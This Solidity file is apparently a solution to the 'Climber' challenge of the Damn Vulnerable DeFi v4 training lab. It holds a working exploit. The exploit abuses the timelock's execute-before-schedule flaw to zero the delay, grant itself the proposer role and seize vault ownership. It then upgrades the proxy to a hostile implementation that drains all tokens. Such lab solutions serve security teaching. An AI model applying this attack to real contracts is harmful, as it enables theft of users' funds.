// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberSolve {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    address recovery;

    address[] public targets;
    uint256[] public values; 
    bytes[] public dataElements; 

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        DamnValuableToken _token,
        address _recovery
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function solve() public {
        
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // execute updateDelay to set delay = 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            uint64(0)
        );

        // grant attacker role PROPOSER
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        // Gain ownership role to upgrade proxy
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            vault.transferOwnership.selector,
            address(this),
            ""
        );

        // Schedule all the previous operations
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            this.scheduleAll.selector,
            address(this),
            ""
        );

        timelock.execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );

        UpgradedClimberVault maliciousVault = new UpgradedClimberVault();
        vault.upgradeToAndCall(address(maliciousVault), "");
        UpgradedClimberVault(address(vault)).withdrawAll(address(token), recovery);
    }

    function scheduleAll() public {
        timelock.schedule(targets, values, dataElements, bytes32(""));
    }
}

contract UpgradedClimberVault is ClimberVault {
    constructor() {
        _disableInitializers();
    }

    function trigger(address token, address recipient) external {
        SafeTransferLib.safeTransfer(
            token,
            recipient,
            IERC20(token).balanceOf(address(this))
        );
    }
    
    function withdrawAll(address token, address receiver) external  {
        IERC20(token).transfer(receiver, IERC20(token).balanceOf(address(this)));
    }

}